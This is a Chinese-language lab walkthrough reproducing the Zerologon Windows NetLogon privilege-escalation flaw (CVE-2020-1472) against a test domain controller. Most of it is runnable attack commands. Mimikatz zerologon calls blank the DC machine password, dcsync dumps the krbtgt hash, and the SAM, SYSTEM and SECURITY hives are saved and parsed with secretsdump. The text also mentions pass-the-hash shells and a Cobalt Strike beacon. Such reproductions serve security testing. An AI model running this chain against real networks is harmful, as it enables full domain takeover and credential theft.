2020年08月12日，Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472
攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序。


影响版本：

Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)

Windows Server 2019 (Server Core installation)

漏洞复现2012域控环境：

172.100.141.205  WIN-UE7EPGITFV0.shiguang.com  域控

172.100.206.76 域用户

域控安装参考下面的文章：

手把手教你安装域控


复现过程：


python版本利用工具 

https://github.com/SecureAuthCorp/impacket

https://github.com/VoidSec/CVE-2020-1472

mimikatz版本利用工具，需要官网下载最新版本：https://github.com/gentilkiwi/mimikatz


mimikatz检测漏洞是否存在

lsadump::zerologon /target:172.100.141.205 /account:WIN-UE7EPGITFV0$ 



置空密码 显示OK 说明置空成功

lsadump::zerologon /target:172.100.141.205 /account:WIN-UE7EPGITFV0$   /exploit



导出指定用户hash

lsadump::dcsync /domain:shiguang.com /dc:WIN-UE7EPGITFV0.shiguang.com /user:krbtgt /authuser:WIN-UE7EPGITFV0$ /authdomain:shiguang /authpassword:""" /authntlm



 利用如果得到的哈希解不开，可以利用哈希传递工具进行远程登陆，哈希利用工具有psexec，wmiexec 获取一个shell，


我这里已经获取到shell，上线到CS上，如果机器长时间置空，容易脱域需要在获取到权限以后，恢复密码。

reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
get system.save
get sam.save
get security.save
del /f system.save
del /f sam.save
del /f security.save



下载以后利用本地 secretsdump 工具得到哈希

secretsdump.exe -sam sam.save -system system.save -security security.save LOCAL



恢复域控密码

lsadump::postzerologon /target:172.100.141.205 /account:WIN-UE7EPGITFV0$

或者使用python脚本

python3 reinstall_original_pw.py WIN-UE7EPGITFV0 172.100.141.205 哈希



再次导出可以看到失败
